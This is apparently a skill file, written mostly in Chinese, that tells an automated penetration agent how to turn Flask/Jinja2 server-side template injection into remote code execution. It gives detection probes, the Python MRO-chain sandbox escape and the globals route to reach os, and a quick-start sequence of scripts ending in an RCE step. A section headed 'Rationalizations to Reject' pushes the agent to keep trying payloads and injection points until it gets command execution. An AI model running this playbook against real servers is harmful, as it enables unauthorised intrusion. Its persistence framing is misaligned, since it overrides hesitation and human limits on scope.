---
name: flask-jinja2-ssti-rce
description: Exploits Flask/Jinja2 Server-Side Template Injection via Python MRO chain traversal to achieve RCE. Use when target runs Python Flask with Jinja2 template engine and user input is reflected in templates.
skill_type: exploit
severity: critical
tags: [python, flask, jinja2, ssti, template-injection, mro]
---

# Flask/Jinja2 服务端模板注入 RCE

## Essential Principles

1. **SSTI 的本质**：用户输入未经转义地被嵌入服务端模板引擎中执行
2. **Jinja2 沙箱绕过**：通过 Python MRO（方法解析顺序）链从任意对象（如空字符串 `''`）出发：
   - `''.__class__.__mro__[1].__subclasses__()` 列出所有子类
   - 找到 `subprocess.Popen` 或 `os._wrap_close` 执行命令
3. **检测方法**：`{{7*7}}` 返回 `49` 确认 Jinja2；`{{7*'7'}}` 返回 `7777777` 二次确认
4. **注入点**：URL 参数、POST 表单字段、HTTP 头、路由路径

## When to Use

- 响应头含 `flask` / `werkzeug` / `jinja2` 等指纹
- 用户输入在页面中直接渲染输出
- `{{7*7}}` 被解析计算而非原样输出
- Python Web 应用（URL 路由风格、错误栈含 Python 特征）

## When NOT to Use

- 非模板引擎（纯静态页面无模板渲染）
- 使用 `render_template_string` 但启用了 SandboxedEnvironment
- 非 Python 框架（Java FreeMarker、PHP Smarty、Node.js Pug 等）

## Rationalizations to Reject

- "SSTI 没找到" -> 试试 POST 参数、Cookie、User-Agent 头等多个注入点
- "找到了 SSTI 但 RCE 失败" -> 换 MRO 链 payload 变体，不同 Python 版本索引不同
- "Jackie 说 SSTI 只能读配置" -> Python 沙箱绕过是经典技术，必出 RCE
- "只有 config 泄露但没命令执行" -> 用 config.__class__.__init__.__globals__ 找 os

## Path Selection

| 条件 | 路径 | 方法 |
|------|------|------|
| SSTI 确认 + 自动 Popen 定位成功 | **A: mro_popen** | MRO 链 -> subprocess.Popen RCE |
| SSTI 确认 + POST 参数 | **B: post_ssti** | POST lipsum globals RCE |
| 全部失败 | **C: LLM 兜底** | ReAct 自由推理 |

## Quick Start

```bash
# 1. SSTI 参数探测
bash {skill_dir}/scripts/probe_ssti.sh {ENDPOINT}

# 2. 确认 Jinja2 引擎
bash {skill_dir}/scripts/confirm_jinja2.sh {ENDPOINT}

# 3. 自动查找 Popen 索引
bash {skill_dir}/scripts/find_popen_index.sh {ENDPOINT}

# 4. 执行 RCE
bash {skill_dir}/scripts/mro_rce_auto.sh {ENDPOINT} {POPEN_IDX}
```
